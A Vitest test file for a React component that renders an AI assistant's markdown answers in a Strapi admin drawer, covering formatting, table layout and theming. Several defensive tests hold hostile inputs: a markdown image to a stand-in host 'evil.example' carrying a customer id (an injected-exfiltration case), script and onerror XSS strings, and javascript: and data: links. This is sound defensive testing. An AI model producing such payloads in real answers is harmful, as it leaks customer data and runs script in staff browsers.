// @vitest-environment jsdom
import { darkTheme, lightTheme } from '@strapi/design-system';
import { screen, within } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { MarkdownBody } from '../../admin/src/components/assistant/MarkdownBody';
import { declarationsOf } from './css';
import { renderInTheme } from './render';

/**
 * The CSS styled-components wrote for an element: every rule in the document that starts with one of the element's classes. The
 * document keeps the CSS of earlier tests, so a test reads only what its own element was drawn with.
 */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

const draw = (text: string, options?: { dark?: boolean }) => {
  const view = renderInTheme(<MarkdownBody text={text} />, options);
  return { ...view, body: view.container.querySelector('[data-message-part="text"]') as HTMLElement };
};

describe('MarkdownBody', () => {
  it('draws paragraphs, bold text, lists and headings', () => {
    const { body } = draw('## Waiting\n\nThree **visits** wait.\n\n- APT-4821\n- APT-4822\n\n1. First\n2. Second');
    expect(within(body).getByRole('heading', { level: 2, name: 'Waiting' })).toBeTruthy();
    expect(body.querySelector('strong')?.textContent).toBe('visits');
    expect(Array.from(body.querySelectorAll('ul li')).map((item) => item.textContent)).toEqual(['APT-4821', 'APT-4822']);
    expect(Array.from(body.querySelectorAll('ol li')).map((item) => item.textContent)).toEqual(['First', 'Second']);
  });

  it('draws a table, which is what the assistant is told to use for items with the same fields', () => {
    const { body } = draw(
      ['| Reference | Customer | Status |', '| --- | --- | --- |', '| APT-4821 | line:U4af…88 | requested |', '| APT-4822 | line:Ub12…09 | confirmed |'].join('\n')
    );
    const table = within(body).getByRole('table');
    expect(within(table).getAllByRole('columnheader').map((cell) => cell.textContent)).toEqual(['Reference', 'Customer', 'Status']);
    expect(within(table).getAllByRole('row')).toHaveLength(3);
    expect(within(table).getByRole('cell', { name: 'line:Ub12…09' })).toBeTruthy();
  });

  it('draws code, a quote, a struck-out word and a task list, which remark-gfm adds', () => {
    const { body } = draw('Use `list_requests`.\n\n```\nline 1\n```\n\n> quoted\n\n~~old~~\n\n- [x] done\n- [ ] open');
    expect(body.querySelector('p code')?.textContent).toBe('list_requests');
    expect(body.querySelector('pre code')?.textContent).toBe('line 1\n');
    expect(body.querySelector('blockquote')?.textContent?.trim()).toBe('quoted');
    expect(body.querySelector('del')?.textContent).toBe('old');
    expect(body.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  // The model reads customer text, so a customer could ask it for an image whose address carries another customer's words.
  it('does not draw an image: nothing is fetched, and nothing is left where it was', () => {
    const { body } = draw('Before ![the strap](https://evil.example/pixel.png?d=line:U4af…88) after');
    expect(body.querySelector('img')).toBeNull();
    expect(body.textContent).toContain('Before');
    expect(body.textContent).toContain('after');
    expect(body.innerHTML).not.toContain('evil.example');
  });

  it('shows raw HTML as text and never as HTML: no element, no handler, no script', () => {
    const { body } = draw('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
    // The only element in the answer is its paragraph: what looks like HTML is text inside it.
    expect(Array.from(body.querySelectorAll('*')).map((element) => element.tagName)).toEqual(['P']);
    expect(body.textContent).toBe('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
  });

  it('draws an http or https link that opens in a new tab and gives the page no way back to its window', () => {
    const { body } = draw('[Care guide](https://example.com/care) and [plain](http://example.com)');
    const [care, plain] = Array.from(body.querySelectorAll('a'));
    expect(care.getAttribute('href')).toBe('https://example.com/care');
    expect(care.getAttribute('target')).toBe('_blank');
    expect(care.getAttribute('rel')).toBe('noopener noreferrer');
    expect(care.textContent).toBe('Care guide');
    expect(plain.getAttribute('href')).toBe('http://example.com/');
    expect(plain.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('draws a bare address as a link, which remark-gfm makes of it, with the same rules', () => {
    const { body } = draw('See https://example.com/care today.');
    const link = body.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://example.com/care');
    expect(link?.getAttribute('target')).toBe('_blank');
  });

  it.each([
    ['javascript:alert(1)'],
    ['JavaScript:alert(1)'],
    ['data:text/html;base64,PHNjcmlwdD4='],
    ['mailto:staff@example.com'],
    ['tel:+81312345678'],
    ['ftp://example.com/file'],
    ['/relative/path'],
    ['#anchor'],
    ['//example.com/protocol-relative'],
  ])('shows the text of a link to %s as plain text, with no link', (href) => {
    const { body } = draw(`Before [the label](${href}) after`);
    expect(body.querySelector('a')).toBeNull();
    expect(body.textContent).toBe('Before the label after');
  });

  it('keeps the node react-markdown hands to its components off the element', () => {
    const { body } = draw('[Care](https://example.com)');
    const link = body.querySelector('a') as HTMLAnchorElement;
    expect(link.hasAttribute('node')).toBe(false);
    expect(link.outerHTML).not.toContain('[object Object]');
    expect(Array.from(link.attributes).map((attribute) => attribute.name).sort()).toEqual(['href', 'rel', 'target']);
  });

  it('is the text of the answer only, so a check can read it apart from the rest of the message', () => {
    const { body } = draw('Hello');
    expect(body.getAttribute('data-message-part')).toBe('text');
  });

  // remark-gfm marks the heading of a footnote section `sr-only`, for screen readers. The design system has no rule for that class.
  it('hides the "Footnotes" heading from the eye and keeps it for a screen reader', () => {
    const { body } = draw('A claim.[^1]\n\n[^1]: Its source.');
    const heading = within(body).getByText('Footnotes');
    expect(heading.classList.contains('sr-only')).toBe(true);
    expect(declarationsOf(body, ' .sr-only')).toMatchObject({
      position: 'absolute',
      width: '1px',
      height: '1px',
      overflow: 'hidden',
      'white-space': 'nowrap',
    });
    expect(declarationsOf(body, ' .sr-only').clip).toMatch(/^rect\(0,? ?0,? ?0,? ?0\)$/);
    // The note itself is still drawn.
    expect(within(body).getByText(/Its source\./)).toBeTruthy();
  });

  it('draws an empty answer as nothing', () => {
    const { body } = draw('');
    expect(body.textContent).toBe('');
  });

  describe('wide content', () => {
    it('keeps a long line of code inside the bubble, with a scroll of its own', () => {
      const { body } = draw('```\n' + 'x'.repeat(300) + '\n```');
      expect(declarationsOf(body, ' pre')['overflow-x']).toBe('auto');
    });
  });

  // The assistant answers in a drawer 600px wide, with a bubble that takes the whole width beside the avatar, and a table of five columns can still be
  // wider than that. Paul saw the first drawer build break cells inside words, one or two letters a line: the bubble's own `word-break: break-word` reaches
  // the cells (`word-break` is inherited), and so did the `overflow-wrap: anywhere` the first build gave them. Each rule below is held on its own.
  describe('tables', () => {
    const TABLE = [
      '| Reference | Customer | Requested | Summary |',
      '| --- | --- | --- | --- |',
      '| APT-4821 | line:Udec…02 | 2026-10-05 | The customer asks whether the strap of the watch can be made shorter before the visit on Saturday |',
    ].join('\n');
    const header = (body: HTMLElement) => within(body).getAllByRole('columnheader')[0];
    const cell = (body: HTMLElement) => within(body).getAllByRole('cell')[0];

    // A real browser lays a table out so that it fits the room it has: it makes the columns narrower, down to the longest piece of text each can break
    // at, and a date such as 2026-10-05 is broken after its second hyphen. That was in the first build, at 600px, in Chrome, and jsdom cannot see it.
    // So the table is as wide as its columns want to be (`max-content`) and never made to fit: it is the table's box, not its columns, that gives way.
    it('is as wide as its columns want to be and not as wide as the bubble, so the browser does not squeeze its columns until a date breaks in two', () => {
      const { body } = draw(TABLE);
      const declarations = declarationsOf(body, ' table');
      expect(declarations.width).toBe('max-content');
      // A table that is `display: block` is made to fit the room it has, and `width: 100%` or a maximum width does the same.
      expect(declarations.display).toBeUndefined();
      expect(declarations['max-width']).toBeUndefined();
      expect(declarations['table-layout']).toBeUndefined();
    });

    it('is in a box of its own that scrolls sideways when the table is wider than the bubble, so only the table moves: the answer, the list and the drawer stay where they are', () => {
      const { body } = draw(TABLE);
      const table = within(body).getByRole('table');
      const scroller = table.parentElement as HTMLElement;
      expect(scroller.tagName).toBe('DIV');
      expect(scroller.parentElement).toBe(body);
      expect(scroller.children).toHaveLength(1);
      expect(declarationsOf(scroller)['overflow-x']).toBe('auto');
      // The table itself does not scroll: its box is the scroller's content.
      expect(declarationsOf(body, ' table')['overflow-x']).toBeUndefined();
    });

    it('gives each table its own box, so one wide table does not move another', () => {
      const { body } = draw(`${TABLE}\n\nBetween the tables.\n\n${TABLE}`);
      const scrollers = within(body).getAllByRole('table').map((table) => table.parentElement);
      expect(scrollers).toHaveLength(2);
      expect(scrollers[0]).not.toBe(scrollers[1]);
    });

    it('does not pass its sideways scroll on, to the page or to the browser\'s swipe back, when it reaches its end', () => {
      const { body } = draw(TABLE);
      const scroller = within(body).getByRole('table').parentElement as HTMLElement;
      expect(declarationsOf(scroller)['overscroll-behavior-x']).toBe('contain');
    });

    it('keeps the space round a table that a paragraph has, on the box and not on the table', () => {
      const { body } = draw(TABLE);
      const scroller = within(body).getByRole('table').parentElement as HTMLElement;
      expect(declarationsOf(scroller).margin).toBe('8px 0');
      expect(declarationsOf(body, ' table').margin).toBeUndefined();
    });

    it('keeps the text of a header cell on one line', () => {
      const { body } = draw(TABLE);
      expect(declarationsOf(body, ' th')['white-space']).toBe('nowrap');
      expect(getComputedStyle(header(body)).whiteSpace).toBe('nowrap');
    });

    it('breaks the text of a body cell between words only: words stay whole, and a word is broken only when it is longer than its column can be', () => {
      const { body } = draw(TABLE);
      const declarations = declarationsOf(body, ' td');
      expect(declarations['white-space']).toBe('normal');
      expect(declarations['overflow-wrap']).toBe('break-word');
      // The bubble gives its text `word-break: break-word`, which `word-break` passes on to the cells and which breaks a word anywhere. A cell sets it back.
      expect(declarations['word-break']).toBe('normal');
      expect(getComputedStyle(cell(body)).whiteSpace).toBe('normal');
    });

    it('never lets a cell, of the header or of the body, break a word anywhere: no `overflow-wrap: anywhere`, no `break-all`, no `break-word` for `word-break`', () => {
      const { body } = draw(TABLE);
      for (const part of [' table', ' thead', ' tbody', ' tr', ' th', ' td']) {
        const declarations = declarationsOf(body, part);
        expect(declarations['overflow-wrap'], part).not.toBe('anywhere');
        expect(declarations['word-break'] ?? 'normal', part).toBe('normal');
        expect(declarations['white-space'] ?? '', part).not.toBe('pre-wrap');
      }
    });

    it('gives a body cell a width of at least 7rem and at most 22rem: a date, a reference or a masked customer keeps its line, and long text wraps inside its column', () => {
      const { body } = draw(TABLE);
      const declarations = declarationsOf(body, ' td');
      expect(declarations['min-width']).toBe('7rem');
      expect(declarations['max-width']).toBe('22rem');
    });

    it('puts the text of every cell at the top of its row, so a short value sits beside the first line of a long one', () => {
      const { body } = draw(TABLE);
      expect(declarationsOf(body, ' td')['vertical-align']).toBe('top');
      expect(declarationsOf(body, ' th')['vertical-align']).toBe('top');
    });

    it('draws a short value as one piece of text that has no space to break at: a date, a reference and a masked customer', () => {
      const { body } = draw(TABLE);
      const [reference, customer, date] = within(body).getAllByRole('cell');
      expect(reference.textContent).toBe('APT-4821');
      expect(customer.textContent).toBe('line:Udec…02');
      expect(date.textContent).toBe('2026-10-05');
      for (const short of [reference, customer, date]) expect(short.textContent).not.toMatch(/\s/);
    });
  });

  describe('colours', () => {
    it('are the theme, never a black overlay: code, code blocks and table headers show in the dark theme too', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |', { dark: true });
      expect(cssOf(body)).not.toMatch(/rgba\(/);
      expect(declarationsOf(body, ' code').background).toBe(darkTheme.colors.neutral150);
      expect(declarationsOf(body, ' pre').background).toBe(darkTheme.colors.neutral150);
      expect(declarationsOf(body, ' th').background).toBe(darkTheme.colors.neutral150);
      expect(declarationsOf(body, ' blockquote')['border-left']).toBe(`3px solid ${darkTheme.colors.neutral300}`);
      expect(cssOf(body)).not.toContain(lightTheme.colors.neutral150);
    });

    it('follow the light theme in the light theme', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |');
      expect(declarationsOf(body, ' th').background).toBe(lightTheme.colors.neutral150);
      expect(declarationsOf(body, ' th')['font-weight']).toBe('600');
      expect(cssOf(body)).not.toContain(darkTheme.colors.neutral150);
    });

    it('give lists their markers and headings their weight, which the design system takes away', () => {
      const { body } = draw('# Title\n\n- one');
      expect(declarationsOf(body, ' ul')['list-style']).toBe('disc');
      expect(declarationsOf(body, ' ol')['list-style']).toBe('decimal');
      for (const heading of [' h1', ' h2', ' h3', ' h4']) expect(declarationsOf(body, heading)['font-weight'], heading).toBe('600');
    });
  });
});
